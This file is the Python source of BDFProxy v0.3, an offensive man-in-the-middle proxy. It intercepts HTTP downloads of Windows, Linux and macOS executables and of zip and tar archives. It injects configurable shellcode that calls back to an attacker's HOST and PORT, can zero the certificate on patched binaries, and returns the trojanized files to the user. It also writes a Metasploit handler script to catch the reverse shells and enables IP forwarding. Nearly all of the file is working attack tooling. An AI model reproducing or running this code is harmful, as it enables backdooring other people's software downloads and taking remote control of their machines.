#!/usr/bin/env python2
"""
    BackdoorFactory Proxy (BDFProxy) v0.3 - 'W00t'
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    Copyright (c) 2013-2015, Joshua Pitts
    All rights reserved.
    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:
        1. Redistributions of source code must retain the above copyright notice,
        this list of conditions and the following disclaimer.
        2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.
        3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software without
        specific prior written permission.
    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
    Tested on Kali-Linux.
"""
try:
    from mitmproxy import controller, proxy, platform
    from mitmproxy.proxy.server import ProxyServer
except:
    from libmproxy import controller, proxy, platform
    from libmproxy.proxy.server import ProxyServer
import os
from bdf import pebin
from bdf import elfbin
from bdf import machobin
import shutil
import sys
import pefile
import logging
import tempfile
import zipfile
import tarfile
import json
from contextlib import contextmanager
from configobj import ConfigObj

version = "Version: v0.3.8"


@contextmanager
def in_dir(dirpath):
    prev = os.path.abspath(os.getcwd())
    os.chdir(dirpath)
    try:
        yield
    finally:
        os.chdir(prev)


def write_resource(resource_file, values):
    with open(resource_file, 'w') as f:
        f.write("#USAGE: msfconsole -r thisscriptname.rc\n\n\n")
        write_statement0 = "use exploit/multi/handler\n"
        write_statement1 = ""
        write_statement2 = ""
        write_statement3 = ""
        write_statement4 = "set ExitOnSession false\n\n"
        write_statement5 = "exploit -j -z\n\n"
        for aDictionary in values:
            if isinstance(aDictionary, dict):
                if aDictionary != {}:
                    for key, value in aDictionary.items():
                        if key == 'MSFPAYLOAD':
                            write_statement1 = 'set PAYLOAD ' + str(value) + "\n"
                        if key == "HOST":
                            write_statement2 = 'set LHOST ' + str(value) + "\n"
                        if key == "PORT":
                            write_statement3 = 'set LPORT ' + str(value) + "\n"
                    f.write(write_statement0)
                    f.write(write_statement1)
                    f.write(write_statement2)
                    f.write(write_statement3)
                    f.write(write_statement4)
                    f.write(write_statement5)


def dict_parse(d):
    tmp_values = {}
    for key, value in d.iteritems():
        if isinstance(value, dict):
            dict_parse(value)
        if key == 'HOST':
            tmp_values['HOST'] = value
        if key == 'PORT':
            tmp_values['PORT'] = value
        if key == 'MSFPAYLOAD':
            tmp_values['MSFPAYLOAD'] = value

    resourceValues.append(tmp_values)


class EnhancedOutput:
    def __init__(self):
        pass

    @staticmethod
    def print_error(txt):
        print "[x] {0}".format(txt)

    @staticmethod
    def print_info(txt):
        print "[*] {0}".format(txt)

    @staticmethod
    def print_warning(txt):
        print "[!] {0}".format(txt)

    @staticmethod
    def logging_error(txt):
        logging.error("[x] Error: {0}".format(txt))

    @staticmethod
    def logging_warning(txt):
        logging.warning("[!] Warning: {0}".format(txt))

    @staticmethod
    def logging_info(txt):
        logging.info("[*] {0}".format(txt))

    @staticmethod
    def logging_debug(txt):
        logging.debug("[.] Debug: {0}".format(txt))

    @staticmethod
    def print_size(f):
        size = len(f) / 1024
        EnhancedOutput.print_info("File size: {0} KB".format(size))


class ProxyMaster(controller.Master):
    user_config = None
    host_blacklist = []
    host_whitelist = []
    keys_blacklist = []
    keys_whitelist = []

    archive_blacklist = []
    archive_max_size = 0
    archive_type = None
    archive_params = {}
    archive_patch_count = 0

    patchIT = False

    def __init__(self, srv):
        controller.Master.__init__(self, srv)

        self.magicNumbers = {'elf': {'number': '7f454c46'.decode('hex'), 'offset': 0},
                             'pe': {'number': 'MZ', 'offset': 0},
                             'gz': {'number': '1f8b'.decode('hex'), 'offset': 0},
                             'bz': {'number': 'BZ', 'offset': 0},
                             'zip': {'number': '504b0304'.decode('hex'), 'offset': 0},
                             'tar': {'number': 'ustar', 'offset': 257},
                             'fatfile': {'number': 'cafebabe'.decode('hex'), 'offset': 0},
                             'machox64': {'number': 'cffaedfe'.decode('hex'), 'offset': 0},
                             'machox86': {'number': 'cefaedfe'.decode('hex'), 'offset': 0},
                             }

    def run(self):
        try:
            EnhancedOutput.logging_debug("Starting ProxyMaster")
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def bytes_have_format(self, bytess, formatt):
        number = self.magicNumbers[formatt]
        if bytess[number['offset']:number['offset'] + len(number['number'])] == number['number']:
            return True
        return False

    def set_config(self):
        try:
            self.user_config = ConfigObj(CONFIGFILE)
            self.host_blacklist = self.user_config['hosts']['blacklist']
            self.host_whitelist = self.user_config['hosts']['whitelist']
            self.keys_blacklist = self.user_config['keywords']['blacklist']
            self.keys_whitelist = self.user_config['keywords']['whitelist']
        except Exception as e:
            EnhancedOutput.print_error("Missing field from config file: {0}".format(e))

    def set_config_archive(self, ar):
        try:
            self.archive_type = ar
            self.archive_blacklist = self.user_config[self.archive_type]['blacklist']
            self.archive_max_size = int(self.user_config[self.archive_type]['maxSize'])
            self.archive_patch_count = int(self.user_config[self.archive_type]['patchCount'])
            self.archive_params = ar
        except Exception as e:
            raise Exception("Missing {0} section from config file".format(e))

    def check_keyword(self, filename):
        keyword_check = False

        if type(self.archive_blacklist) is str:
            if self.archive_blacklist.lower() in filename:
                keyword_check = True
        else:
            for keyword in self.archive_blacklist:
                if keyword.lower() in filename:
                    keyword_check = True
                    continue

        return keyword_check

    def inject_tar(self, aTarFileBytes, formatt=None):
        # When called will unpack and edit a Tar File and return a tar file"

        if len(aTarFileBytes) > int(self.archive_max_size):
            print "[!] TarFile over allowed size"
            logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
            return aTarFileBytes

        tmp_file = tempfile.NamedTemporaryFile()
        tmp_file.write(aTarFileBytes)
        tmp_file.seek(0)

        compression_mode = ':'
        if formatt == 'gz':
            compression_mode = ':gz'
        if formatt == 'bz':
            compression_mode = ':bz2'

        try:
            tar_file = tarfile.open(fileobj=tmp_file, mode='r' + compression_mode)
        except tarfile.ReadError:
            EnhancedOutput.print_warning("Not a tar file!")
            tmp_file.close()
            return aTarFileBytes

        EnhancedOutput.print_info("TarFile contents and info (compression: {0}):".format(formatt))

        members = tar_file.getmembers()
        for info in members:
            print "\t{0} {1}".format(info.name, info.size)

        new_tar_storage = tempfile.NamedTemporaryFile()
        new_tar_file = tarfile.open(mode='w' + compression_mode, fileobj=new_tar_storage)

        patch_count = 0
        was_patched = False

        for info in members:
            try:
                EnhancedOutput.print_info(">>> Next file in tarfile: {0}".format(info.name))

                if not info.isfile():
                    EnhancedOutput.print_warning("{0} is not a file, skipping".format(info.name))
                    new_tar_file.addfile(info, tar_file.extractfile(info))
                    continue

                if info.size >= long(self.FileSizeMax):
                    EnhancedOutput.print_warning("{0} is too big, skipping".format(info.name))
                    new_tar_file.addfile(info, tar_file.extractfile(info))
                    continue

                # Check against keywords
                if self.check_keyword(info.name.lower()) is True:
                    EnhancedOutput.print_warning("Tar blacklist enforced!")
                    EnhancedOutput.logging_info('Tar blacklist enforced on {0}'.format(info.name))
                    continue
            except:
                print "[!] strange formating, bailing on this file"
                continue

            # Try to patch
            extracted_file = tar_file.extractfile(info)

            if patch_count >= self.archive_patch_count:
                EnhancedOutput.logging_info("Met archive config patchCount limit. Adding original file")
                new_tar_file.addfile(info, extracted_file)
            else:
                # create the file on disk temporarily for fileGrinder to run on it
                with tempfile.NamedTemporaryFile() as tmp:
                    shutil.copyfileobj(extracted_file, tmp)
                    tmp.flush()
                    patch_result = self.binaryGrinder(tmp.name)
                    if patch_result:
                        patch_count += 1
                        file2 = os.path.join(BDFOLDER, os.path.basename(tmp.name))
                        EnhancedOutput.print_info("Patching complete, adding to archive file.")
                        EnhancedOutput.logging_info("{0} in archive patched, adding to final archive".format(info.name))
                        info.size = os.stat(file2).st_size
                        with open(file2, 'rb') as f:
                            new_tar_file.addfile(info, f)
                        os.remove(file2)
                        was_patched = True
                    else:
                        EnhancedOutput.print_error("Patching failed")
                        EnhancedOutput.logging_error("{0} patching failed. Keeping original file.".format(info.name))
                        with open(tmp.name, 'rb') as f:
                            new_tar_file.addfile(info, f)

        # finalize the writing of the tar file first
        new_tar_file.close()

        if was_patched is False:
            # If nothing was changed return the original
            EnhancedOutput.print_info("No files were patched. Forwarding original file")
            new_tar_storage.close()  # it's automatically deleted
            return aTarFileBytes

        # then read the new tar file into memory
        new_tar_storage.seek(0)
        buf = new_tar_storage.read()
        new_tar_storage.close()  # it's automatically deleted

        return buf

    def inject_zip(self, aZipFile):
        # When called will unpack and edit a Zip File and return a zip file
        if len(aZipFile) > int(self.archive_max_size):
            print "[!] ZipFile over allowed size"
            logging.info("ZipFIle maxSize met %s", len(aZipFile))
            return aZipFile

        tmp_file = tempfile.NamedTemporaryFile()
        tmp_file.write(aZipFile)
        tmp_file.seek(0)

        zippyfile = zipfile.ZipFile(tmp_file.name, 'r')

        # encryption test
        try:
            zippyfile.testzip()
        except RuntimeError as e:
            if 'encrypted' in str(e):
                EnhancedOutput.print_warning("Encrypted zipfile found. Not patching.")
            else:
                EnhancedOutput.print_warning("Zipfile test failed. Returning original archive")
            zippyfile.close()
            tmp_file.close()
            return aZipFile

        EnhancedOutput.print_info("ZipFile contents and info:")

        for info in zippyfile.infolist():
            print "\t{0} {1}".format(info.filename, info.file_size)

        tmpDir = tempfile.mkdtemp()
        zippyfile.extractall(tmpDir)

        patch_count = 0
        was_patched = False

        for info in zippyfile.infolist():
            EnhancedOutput.print_info(">>> Next file in zipfile: {0}".format(info.filename))
            actual_file = os.path.join(tmpDir, info.filename)

            if os.path.islink(actual_file) or not os.path.isfile(actual_file):
                EnhancedOutput.print_warning("{0} is not a file, skipping".format(info.filename))
                continue

            if os.lstat(actual_file).st_size >= long(self.FileSizeMax):
                EnhancedOutput.print_warning("{0} is too big, skipping".format(info.filename))
                continue

            # Check against keywords
            if self.check_keyword(info.filename.lower()) is True:
                EnhancedOutput.print_warning("Zip blacklist enforced!")
                EnhancedOutput.logging_info('Zip blacklist enforced on {0}'.format(info.filename))
                continue

            if patch_count >= self.archive_patch_count:
                EnhancedOutput.logging_info("Met archive config patchCount limit. Adding original file")
                break
            else:
                patch_result = self.binaryGrinder(actual_file)
                if patch_result:
                    patch_count += 1
                    file2 = os.path.join(BDFOLDER, os.path.basename(info.filename))
                    EnhancedOutput.print_info("Patching complete, adding to archive file.")
                    shutil.copyfile(file2, actual_file)
                    EnhancedOutput.logging_info("{0} in archive patched, adding to final archive".format(info.filename))
                    os.remove(file2)
                    was_patched = True
                else:
                    EnhancedOutput.print_error("Patching failed")
                    EnhancedOutput.logging_error("{0} patching failed. Keeping original file.".format(info.filename))

        zippyfile.close()

        if was_patched is False:
            EnhancedOutput.print_info("No files were patched. Forwarding original file")
            tmp_file.close()
            shutil.rmtree(tmpDir, ignore_errors=True)
            return aZipFile

        zip_result = zipfile.ZipFile(tmp_file.name, 'w', zipfile.ZIP_DEFLATED)

        for base, dirs, files in os.walk(tmpDir):
            for afile in files:
                filename = os.path.join(base, afile)
                zip_result.write(filename, arcname=filename.replace(tmpDir + '/', ''))

        zip_result.close()
        # clean up
        shutil.rmtree(tmpDir, ignore_errors=True)

        with open(tmp_file.name, 'rb') as f:
            zip_data = f.read()
            tmp_file.close()

        return zip_data

    def str2bool(self, val):
        if val.lower() == 'true':
            return True
        elif val.lower() == 'false':
            return False
        else:
            return None

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """
        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                # update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                   self.WindowsType.lower() in ['all', 'x64']):
                    add_section = False
                    cave_jumping = False
                    if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
                        cave_jumping = True

                    targetFile = pebin.pebin(FILE=binaryFile,
                                             OUTPUT=os.path.basename(binaryFile),
                                             SHELL=self.WindowsIntelx64['SHELL'],
                                             HOST=self.WindowsIntelx64['HOST'],
                                             PORT=int(self.WindowsIntelx64['PORT']),
                                             ADD_SECTION=add_section,
                                             CAVE_JUMPING=cave_jumping,
                                             IMAGE_TYPE=self.WindowsType,
                                             RUNAS_ADMIN=self.str2bool(self.WindowsIntelx86['RUNAS_ADMIN']),
                                             PATCH_DLL=self.str2bool(self.WindowsIntelx64['PATCH_DLL']),
                                             SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                             ZERO_CERT=self.str2bool(self.WindowsIntelx64['ZERO_CERT']),
                                             PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower(),
                                             SUPPLIED_BINARY=self.WindowsIntelx64['SUPPLIED_BINARY'],
                                             IDT_IN_CAVE=self.str2bool(self.WindowsIntelx64['IDT_IN_CAVE']),
                                             CODE_SIGN=self.str2bool(self.WindowsIntelx64['CODE_SIGN']),
                                             PREPROCESS=self.str2bool(self.WindowsIntelx64['PREPROCESS']),
                                             )

                    result = targetFile.run_this()

                elif (machineType == 0x14c and
                      self.WindowsType.lower() in ['all', 'x86']):
                    add_section = False
                    cave_jumping = False
                    # add_section wins for cave_jumping
                    # default is single for BDF
                    if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
                        cave_jumping = True
                        add_section = False

                    targetFile = pebin.pebin(FILE=binaryFile,
                                             OUTPUT=os.path.basename(binaryFile),
                                             SHELL=self.WindowsIntelx86['SHELL'],
                                             HOST=self.WindowsIntelx86['HOST'],
                                             PORT=int(self.WindowsIntelx86['PORT']),
                                             ADD_SECTION=add_section,
                                             CAVE_JUMPING=cave_jumping,
                                             IMAGE_TYPE=self.WindowsType,
                                             RUNAS_ADMIN=self.str2bool(self.WindowsIntelx86['RUNAS_ADMIN']),
                                             PATCH_DLL=self.str2bool(self.WindowsIntelx86['PATCH_DLL']),
                                             SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
                                             ZERO_CERT=self.str2bool(self.WindowsIntelx86['ZERO_CERT']),
                                             PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower(),
                                             SUPPLIED_BINARY=self.WindowsIntelx86['SUPPLIED_BINARY'],
                                             XP_MODE=self.str2bool(self.WindowsIntelx86['XP_MODE']),
                                             IDT_IN_CAVE=self.str2bool(self.WindowsIntelx86['IDT_IN_CAVE']),
                                             CODE_SIGN=self.str2bool(self.WindowsIntelx86['CODE_SIGN']),
                                             PREPROCESS=self.str2bool(self.WindowsIntelx86['PREPROCESS']),
                                             )

                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    # x86CPU Type
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx86['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType,
                                               PREPROCESS=self.str2bool(self.LinuxIntelx86['PREPROCESS']),
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    # x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx64['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType,
                                               PREPROCESS=self.str2bool(self.LinuxIntelx64['PREPROCESS']),
                                               )
                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') in ['cefaedfe', 'cffaedfe', 'cafebabe']:  # Macho
                targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                # ONE CHIP SET MUST HAVE PRIORITY in FAT FILE

                if targetFile.FAT_FILE is True:
                    if self.FatPriority == 'x86':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx86['SHELL'],
                                                       HOST=self.MachoIntelx86['HOST'],
                                                       PORT=int(self.MachoIntelx86['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority,
                                                       PREPROCESS=self.str2bool(self.MachoIntelx86['PREPROCESS']),
                                                       )
                        result = targetFile.run_this()

                    elif self.FatPriority == 'x64':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx64['SHELL'],
                                                       HOST=self.MachoIntelx64['HOST'],
                                                       PORT=int(self.MachoIntelx64['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority,
                                                       PREPROCESS=self.str2bool(self.MachoIntelx64['PREPROCESS']),
                                                       )
                        result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx86['SHELL'],
                                                   HOST=self.MachoIntelx86['HOST'],
                                                   PORT=int(self.MachoIntelx86['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority,
                                                   PREPROCESS=self.str2bool(self.MachoIntelx86['PREPROCESS']),
                                                   )
                    result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx64['SHELL'],
                                                   HOST=self.MachoIntelx64['HOST'],
                                                   PORT=int(self.MachoIntelx64['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority,
                                                   PREPROCESS=self.str2bool(self.MachoIntelx64['PREPROCESS']),
                                                   )
                    result = targetFile.run_this()

            return result

        except Exception as e:
            EnhancedOutput.print_error('binaryGrinder: {0}'.format(e))
            EnhancedOutput.logging_warning("Exception in binaryGrinder {0}".format(e))
            return None

    def hosts_whitelist_check(self, flow):
        if self.host_whitelist.lower() == 'all':
            self.patchIT = True

        elif type(self.host_whitelist) is str:
            if self.host_whitelist.lower() in flow.request.host.lower():
                self.patchIT = True
                EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1}".format(self.host_whitelist, flow.request.host))
        elif flow.request.host.lower() in self.host_whitelist.lower():
            self.patchIT = True
            EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, flow.request.host))
        else:
            for keyword in self.host_whitelist:
                if keyword.lower() in flow.requeset.host.lower():
                    self.patchIT = True
                    EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, flow.request.host))
                    break

    def keys_whitelist_check(self, flow):
        # Host whitelist check takes precedence
        if self.patchIT is False:
            return None

        if self.keys_whitelist.lower() == 'all':
            self.patchIT = True
        elif type(self.keys_whitelist) is str:
            if self.keys_whitelist.lower() in flow.request.path.lower():
                self.patchIT = True
                EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
        elif flow.request.host.lower() in [x.lower() for x in self.keys_whitelist]:
            self.patchIT = True
            EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
        else:
            for keyword in self.keys_whitelist:
                if keyword.lower() in flow.requeset.path.lower():
                    self.patchIT = True
                    EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
                    break

    def keys_backlist_check(self, flow):
        if type(self.keys_blacklist) is str:
            if self.keys_blacklist.lower() in flow.request.path.lower():
                self.patchIT = False
                EnhancedOutput.logging_info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, flow.request.path))
        else:
            for keyword in self.keys_blacklist:
                if keyword.lower() in flow.request.path.lower():
                    self.patchIT = False
                    EnhancedOutput.logging_info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, flow.request.path))
                    break

    def hosts_blacklist_check(self, flow):
        if type(self.host_blacklist) is str:
            if self.host_blacklist.lower() in flow.request.host.lower():
                self.patchIT = False
                EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
        elif flow.request.host.lower() in [x.lower() for x in self.host_blacklist]:
            self.patchIT = False
            EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
        else:
            for host in self.host_blacklist:
                if host.lower() in flow.request.host.lower():
                    self.patchIT = False
                    EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
                    break

    def parse_target_config(self, targetConfig):
        for key, value in targetConfig.items():
            if hasattr(self, key) is False:
                setattr(self, key, value)
                EnhancedOutput.logging_debug("Settings Config {0}: {1}".format(key, value))

            elif getattr(self, key, value) != value:
                if value == "None":
                    continue

                # test if string can be easily converted to dict
                if ':' in str(value):
                    for tmpkey, tmpvalue in dict(value).items():
                        getattr(self, key, value)[tmpkey] = tmpvalue
                        EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(tmpkey, tmpvalue))
                else:
                    setattr(self, key, value)
                    EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(key, value))

    '''
    def inject(self, flow):
        EnhancedOutput.print_size(flow)

        if len(flow) > self.archive_max_size:
            EnhancedOutput.print_error("{0} over allowed size".format(self.archive_type))
            EnhancedOutput.logging_info("{0} maxSize met {1}".format(self.archive_type, len(flow)))
            return flow

        buf = None

        if self.archive_type == "ZIP":
            buf = self.inject_zip(flow)
        elif self.archive_type == "TAR":
            buf = self.inject_tar(flow, self.archive_params['filter'])

        return buf
    '''

    def handle_request(self, flow):
        print "*" * 10, "REQUEST", "*" * 10
        EnhancedOutput.print_info("HOST: {0}".format(flow.request.host))
        EnhancedOutput.print_info("PATH: {0}".format(flow.request.path))
        flow.reply()
        print "*" * 10, "END REQUEST", "*" * 10

    def handle_response(self, flow):
        # Read config here for dynamic updating
        self.set_config()

        for target in self.user_config['targets'].keys():
            if target == 'ALL':
                self.parse_target_config(self.user_config['targets']['ALL'])

            if target in flow.request.host:
                self.parse_target_config(self.user_config['targets'][target])

        print "=" * 10, "RESPONSE", "=" * 10

        EnhancedOutput.print_info("HOST: {0}".format(flow.request.host))
        EnhancedOutput.print_info("PATH: {0}".format(flow.request.path))

        # Below are gates from whitelist --> blacklist
        # Blacklists have the final say, but everything starts off as not patchable
        # until a rule says True. Host whitelist over rides keyword whitelist.

        # Fail safe.. rules must set it to true.
        self.patchIT = False

        self.hosts_whitelist_check(flow)
        self.keys_whitelist_check(flow)
        self.keys_backlist_check(flow)
        self.hosts_blacklist_check(flow)

        if 'content-length' in flow.request.headers.keys():
            if int(flow.request.headers['content-length'][0]) >= long(self.FileSizeMax):
                EnhancedOutput.print_warning("Not patching over content-length, forwarding to user")
                EnhancedOutput.logging_info("Over FileSizeMax setting {0} : {1}".format(flow.request.host, flow.request.path))
                self.patchIT = False

        if self.patchIT is False:
            EnhancedOutput.print_warning("Not patching, flow did not make it through config settings")
            EnhancedOutput.logging_info("Config did not allow the patching of HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))

            flow.reply()
        else:
            if self.bytes_have_format(flow.reply.obj.response.content, 'zip') and self.str2bool(self.CompressedFiles) is True:
                    aZipFile = flow.reply.obj.response.content
                    self.set_config_archive('ZIP')
                    flow.reply.obj.response.content = self.inject_zip(aZipFile)

            elif self.bytes_have_format(flow.reply.obj.response.content, 'pe') or self.bytes_have_format(flow.reply.obj.response.content, 'elf') or \
                    self.bytes_have_format(flow.reply.obj.response.content, 'fatfile') or self.bytes_have_format(flow.reply.obj.response.content, 'machox86') or \
                    self.bytes_have_format(flow.reply.obj.response.content, 'machox64'):

                tmp = tempfile.NamedTemporaryFile()
                tmp.write(flow.reply.obj.response.content)
                tmp.flush()
                tmp.seek(0)

                patchResult = self.binaryGrinder(tmp.name)
                if patchResult:
                    EnhancedOutput.print_info("Patching complete, forwarding to user.")
                    EnhancedOutput.logging_info("Patching complete for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))

                    bd_file = os.path.join(BDFOLDER, os.path.basename(tmp.name))
                    with open(bd_file, 'r+b') as file2:
                        flow.reply.obj.response.content = file2.read()
                        file2.close()

                    os.remove(bd_file)
                else:
                    EnhancedOutput.print_error("Patching failed")
                    EnhancedOutput.logging_info("Patching failed for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))

                # add_try to delete here

                tmp.close()
            elif self.bytes_have_format(flow.reply.obj.response.content, 'gz') and self.str2bool(self.CompressedFiles) is True:
                # assume .tar.gz for now
                self.set_config_archive('TAR')
                flow.reply.obj.response.content = self.inject_tar(flow.reply.obj.response.content, 'gz')
            elif self.bytes_have_format(flow.reply.obj.response.content, 'bz') and self.str2bool(self.CompressedFiles) is True:
                # assume .tar.bz for now
                self.set_config_archive('TAR')
                flow.reply.obj.response.content = self.inject_tar(flow.reply.obj.response.content, 'bz')
            elif self.bytes_have_format(flow.reply.obj.response.content, 'tar') and self.str2bool(self.CompressedFiles) is True:
                self.set_config_archive('TAR')
                flow.reply.obj.response.content = self.inject_tar(flow.reply.obj.response.content, 'tar')

            flow.reply()

        print "=" * 10, "END RESPONSE", "=" * 10

################################## START MAIN #######################################

CONFIGFILE = "third-party/BDFProxy/bdfproxy.cfg"
BDFOLDER = "third-party/BDFProxy/backdoored"

# Initial CONFIG reading
user_config = ConfigObj(CONFIGFILE)

#################### BEGIN OVERALL CONFIGS ############################
# DOES NOT UPDATE ON THE FLY
resourceScript = user_config['Overall']['resourceScriptFile']

config = proxy.ProxyConfig(clientcerts=os.path.expanduser(user_config['Overall']['certLocation']),
                           body_size_limit=int(user_config['Overall']['MaxSizeFileRequested']),
                           port=int(user_config['Overall']['proxyPort']),
                           mode=user_config['Overall']['proxyMode'],
                           )

if user_config['Overall']['proxyMode'] != "None":
    config.proxy_mode = {'sslports': user_config['Overall']['sslports'],
                         'resolver': platform.resolver()
                         }

server = ProxyServer(config)

numericLogLevel = getattr(logging, user_config['Overall']['loglevel'].upper(), None)

if not isinstance(numericLogLevel, int):
    EnhancedOutput.print_error("INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
    sys.exit(1)

logging.basicConfig(filename=user_config['Overall']['logname'],
                    level=numericLogLevel,
                    format='%(asctime)s %(message)s'
                    )

#################### END OVERALL CONFIGS ##############################

# Write resource script
EnhancedOutput.print_warning("Writing resource script.")
resourceValues = []
dict_parse(user_config['targets'])
try:
    write_resource(str(resourceScript), resourceValues)
except Exception as e:
    EnhancedOutput.print_error(e)
    sys.exit(1)

EnhancedOutput.print_warning("Resource writen to {0}".format(str(resourceScript)))
EnhancedOutput.print_warning("Configuring traffic forwarding")

try:
    if sys.platform == "darwin":
        os.system("sysctl -w net.inet.ip.forwarding=1")
    elif sys.platform.startswith("linux"):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
except Exception as e:
    EnhancedOutput.print_error(e)
    sys.exit(1)

m = ProxyMaster(server)
try:
    m.set_config()
except Exception as e:
    EnhancedOutput.print_error("Your config file is broken: {0}".format(e))
    EnhancedOutput.logging_error("Your config file is broken: {0}".format(e))
    sys.exit(1)

EnhancedOutput.print_info("Starting BDFProxy")
EnhancedOutput.print_info(version)
EnhancedOutput.print_info("Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com")
